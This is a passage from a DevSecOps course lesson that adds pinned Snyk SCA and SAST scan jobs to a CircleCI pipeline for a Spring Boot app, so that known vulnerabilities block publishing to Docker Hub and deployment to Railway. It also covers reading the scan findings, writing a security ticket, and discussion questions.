| **We pin the full version** | `@2.3.0`, not `@2` or `@volatile`. A partial version like `@2` follows the newest `2.x` release - that's a **moving** reference again |
| **Trusted publisher** | `snyk/` is Snyk's own namespace, marked **PARTNER** in the registry - only Snyk can publish there |
| **The CLI version is pinned too** | `cli-version: 1.1308.1` - the orb doesn't silently pick up a newer, untested CLI |
| **Download integrity check** | The orb checks the downloaded CLI against Snyk's published SHA-256 checksum before running it |
| **The token stays out of config** | `snyk/scan` reads the token from the `SNYK_TOKEN` environment variable - it never appears in `config.yml` |

**Two honest limits:**
- The orb downloads the CLI's checksum from the same Snyk server as the CLI. That catches broken or tampered downloads in transit - but not a compromised Snyk server. Pinning the orb and CLI versions, and not rushing to brand-new releases, reduce that risk
- Allowing uncertified orbs allows **any** partner or community orb in your organization. Keep using only orbs from publishers you trust, pinned to full versions

#### Step 8: Add the `snyk_code` Job (SAST)

`snyk_scan` reads `pom.xml`. To analyse **your own code**, add a second job that runs **Snyk Code**:

```yml
  # ==========================================
  # SNYK_CODE JOB - Snyk Code: static analysis (SAST) of src/
  # ==========================================
  snyk_code:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - snyk/scan:
          command: code test
          severity-threshold: high
          cli-version: 1.1308.1
          monitor-on-build: false
```

| Line | Purpose |
|---|---|
| `command: code test` | Runs `snyk code test` - static analysis of the source code, instead of the default `snyk test` (dependencies) |
| `severity-threshold: high` | Fails the job on HIGH issues (Snyk Code uses Low, Medium and High) |
| No `restore_cache` | Snyk Code reads the source files directly - it doesn't need Maven |

**Needs Snyk Code turned on** (Step 4) - otherwise the job fails with a message that Snyk Code is not enabled.

#### Step 9: Update the Workflow

```yml
workflows:
  build_test_scan_publish_deploy:
    jobs:
      - build
      - snyk_scan
      - snyk_code
      - test:
          requires:
            - build
      - publish:
          context: docker-hub
          requires:
            - test
            - snyk_scan
            - snyk_code
      - deploy:
          requires:
            - publish
```

**What changed?**
- `snyk_scan` and `snyk_code` have no `requires` - they start with `build`, so you get feedback within minutes (shift left!)
- `publish` now waits for `test`, `snyk_scan` **and** `snyk_code`
- If `snyk_scan` fails, nothing is pushed to Docker Hub and Railway keeps the previous version

**Complete updated config.yml:**

```yml
version: 2.1

orbs:
  snyk: snyk/snyk@2.3.0

jobs:
  build:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - restore_cache:
          keys:
            - maven-deps-{{ checksum "pom.xml" }}
            - maven-deps-
      - run:
          name: Install dependencies and build
          command: |
            echo "Building the application..."
            mvn clean install -DskipTests
      - save_cache:
          paths:
            - ~/.m2
          key: maven-deps-{{ checksum "pom.xml" }}
      - persist_to_workspace:
          root: .
          paths:
            - target/*.jar

  test:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - restore_cache:
          keys:
            - maven-deps-{{ checksum "pom.xml" }}
            - maven-deps-
      - run:
          name: Run tests
          command: |
            echo "Running tests..."
            mvn test
      - store_test_results:
          path: target/surefire-reports
      - store_artifacts:
          path: target/surefire-reports

  # ==========================================
  # SNYK_SCAN JOB - Snyk: scan Maven dependencies
  # ==========================================
  snyk_scan:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - restore_cache:
          keys:
            - maven-deps-{{ checksum "pom.xml" }}
            - maven-deps-
      - snyk/scan:
          severity-threshold: high
          cli-version: 1.1308.1
          monitor-on-build: false

  # ==========================================
  # SNYK_CODE JOB - Snyk Code: static analysis (SAST) of src/
  # ==========================================
  snyk_code:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - snyk/scan:
          command: code test
          severity-threshold: high
          cli-version: 1.1308.1
          monitor-on-build: false

  publish:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - attach_workspace:
          at: .
      - setup_remote_docker
      - run:
          name: Build Docker image
          command: |
            echo "Building Docker image..."
            docker build -t $DOCKER_USERNAME/devops-demo:latest .
      - run:
          name: Push to Docker Hub
          command: |
            echo "Logging in to Docker Hub..."
            echo $DOCKER_TOKEN | docker login -u $DOCKER_USERNAME --password-stdin
            echo "Pushing image to Docker Hub..."
            docker push $DOCKER_USERNAME/devops-demo:latest

  deploy:
    docker:
      - image: cimg/node:lts
    steps:
      - run:
          name: Redeploy latest image on Railway
          command: |
            echo "Asking Railway to redeploy the latest image..."
            npx --yes @railway/cli redeploy --service "$RAILWAY_SERVICE_ID" --yes
            echo "Railway is now pulling $DOCKER_USERNAME/devops-demo:latest from Docker Hub."

workflows:
  build_test_scan_publish_deploy:
    jobs:
      - build
      - snyk_scan
      - snyk_code
      - test:
          requires:
            - build
      - publish:
          context: docker-hub
          requires:
            - test
            - snyk_scan
            - snyk_code
      - deploy:
          requires:
            - publish
```

```bash
git add .circleci/config.yml
git commit -m "Add Snyk dependency (SCA) and code (SAST) scans"
git push origin main
```

#### Step 10: Watch the Security Gate Stop the Release

In CircleCI, `build`, `snyk_scan` and `snyk_code` start together.

**Expected result:**
- ✅ `build` and `test` pass - the code compiles and the tests work
- ❌ `snyk_scan` **fails** - HIGH or CRITICAL vulnerabilities in the dependencies
- `snyk_code` passes or fails, depending on what Snyk Code finds in the source
- ⏹ `publish` and `deploy` **never run** - nothing is pushed to Docker Hub, and Railway keeps running the last version

**The gate did its job.** Code that works but isn't safe did not reach production.

#### Step 11: Read the Findings

Click **snyk_scan** → expand **Run Snyk**. The output looks similar to this:

```
Testing /home/circleci/project...

Tested 38 dependencies for known issues, found 6 issues, 9 vulnerable paths.

Issues to fix by upgrading:

  Upgrade org.springframework.boot:spring-boot-starter-webmvc@x.y.z to ...@x.y.w to fix
  ✗ Denial of Service (DoS) [High Severity][https://security.snyk.io/vuln/SNYK-JAVA-...] in org.apache.tomcat.embed:tomcat-embed-core@...
    introduced by org.springframework.boot:spring-boot-starter-webmvc@x.y.z > ... > org.apache.tomcat.embed:tomcat-embed-core@...
```

For each issue, note:

| Part | Meaning |
|---|---|
| **Library and version** | The vulnerable package - often a **transitive** dependency |
| **Severity** | Critical or High - at or above our threshold |
| **introduced by** | The path from **your** `pom.xml` to the vulnerable library |
| **Upgrade ... to fix** | Snyk's fix advice - often a newer **Spring Boot** version |
| **Link** | Full details: CVE ID, CVSS score, references |

Then open **snyk_code**: Snyk Code issues show the **file**, **line** and **type** of problem in your own code.

**How would developers fix these?** Usually by upgrading the Spring Boot parent version in `pom.xml` (for SCA findings) or by changing the code (for SAST findings), then re-running the pipeline. That's **their** job - not today's.

> **FYI - `fail-on-issues: false`:** the orb has a setting that lets the job pass even when it finds issues:
>
> ```yml
>       - snyk/scan:
>           fail-on-issues: false
> ```
>
> The pipeline would then publish and deploy **known-vulnerable code**, and the gate would only print a report. **We don't use it in this course, and it's not good practice** - fix the issues, or accept a specific issue with a reviewed, time-limited exception (`snyk ignore` with a reason and an expiry), instead of switching the gate off.

---

### Part C - Report to the Developers

In a real team, the DevSecOps team doesn't fix the application - it **reports** the problem so the developers can plan the fix.

#### Step 12: Open a Security Ticket

In your **devops-demo** repository on GitHub, open **Issues** → **New issue**:

```markdown
Title: [Security] Snyk found HIGH/CRITICAL vulnerabilities - release blocked

**Found by:** CircleCI snyk_scan / snyk_code - pipeline #<number> (link)
**Impact:** publish and deploy are blocked until these are fixed

| Library / file | Severity | Issue | Fix advice |
|---|---|---|---|
| tomcat-embed-core x.y.z | High | Denial of Service | Upgrade Spring Boot to x.y.w |
| ... | ... | ... | ... |

**Suggested next step:** upgrade the Spring Boot parent version, re-run the pipeline.
```

Fill the table from **your** pipeline's output - the top 3-5 issues are enough.

**A good security ticket:**
- Says **what** was found, **where**, and **how serious** it is
- Links to the **evidence** (the failed pipeline)
- Includes the **fix advice**, so developers can act quickly
- Doesn't paste secrets or tokens

---

### Discuss

1. `build` and `test` passed, but the release was blocked. Why isn't passing tests enough?
2. The Snyk website already showed the issues. Why put the scans **in the pipeline** as well?
3. `snyk_scan` (SCA) and `snyk_code` (SAST) found different things. What does each one look at?
4. A teammate suggests `fail-on-issues: false` "so we can keep deploying". What would you say?
5. Which jobs in your pipeline can see your Docker Hub and Railway tokens? Which ones don't need to?

<!-- Answers: 1) Tests check behaviour, not known vulnerabilities - vulnerable code can work perfectly. 2) The website only reports; the pipeline job blocks publish/deploy. 3) SCA: libraries in pom.xml (other people's code); SAST: patterns in our own source. 4) It turns the gate into a report and ships known-vulnerable code; instead fix, or accept a specific issue with a reviewed, time-limited ignore. 5) publish (docker-hub context) and deploy (RAILWAY_TOKEN); project env vars are visible to all jobs - contexts limit that. -->

---

## Summary

### What You Learned Today

1. ✅ **DevSecOps** integrates security throughout the development lifecycle
2. ✅ **Shift-Left** means catching security issues early — cheaper and faster
3. ✅ **Pipeline Risks** include hardcoded secrets, vulnerable dependencies, and insecure containers
4. ✅ **Secrets Management** uses environment variables, never hardcoded values
5. ✅ **Dependency Vulnerabilities** are tracked as CVEs and need automated scanning
6. ✅ **Security Scanning Tools** - SAST (your code), DAST (running app), SCA (dependencies), container scanning
7. ✅ **Supply-chain security** - the Trivy attack showed why tools are pinned by hash, not by tag
8. ✅ **Snyk** scans dependencies (SCA) and your own code (SAST, Snyk Code) - on its website and as CircleCI gates that block publish and deploy
9. ✅ **The DevSecOps role** - find, stop and **report** security problems; developers fix them

---

### Key Takeaways

**DevSecOps Mindset:**
- Security is everyone's responsibility
- Automate security checks
- Find and fix issues early
- Continuous improvement

**Critical Practices:**
- Never hardcode secrets
- Use environment variables
- Scan dependencies regularly
- Keep libraries updated
- Integrate security into CI/CD

**Cost of Security Issues:**
- Fix during development: Minutes
- Fix in production: Weeks + reputation damage
- Shift-left saves time and money

---

### Preparing for Lesson 4.14

**In the next lesson, you will:**
1. Add **OSV-Scanner** (Google) as a GitHub Actions workflow - pinned by commit SHA
2. See its results in your repository's **Security** tab
3. Handle a finding by fixing it or ignoring it - with a reason and an expiry date
4. Run an **OWASP ZAP** DAST scan against your live Railway app

**Before next lesson:**
- Keep today's pipeline as it is - `snyk_scan` failing is expected; your Railway app keeps running the version deployed in Lesson 4.12
- Have your Railway app URL ready

---

## Additional Resources

- [OWASP DevSecOps Guideline](https://owasp.org/www-project-devsecops-guideline/)
- [DevSecOps Manifesto](https://www.devsecops.org/)
- [NIST DevSecOps Reference Architecture](https://csrc.nist.gov/publications/detail/sp/800-204c/final)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [CVE Database](https://cve.mitre.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Snyk Learn](https://snyk.io/learn/)
- [Snyk CLI Documentation](https://docs.snyk.io/developer-tools/snyk-cli)
- [Trivy supply-chain attack - Aqua Security](https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know)
- [GitHub: Security hardening for GitHub Actions (pin actions to a full commit SHA)](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Security Features](https://docs.github.com/en/code-security)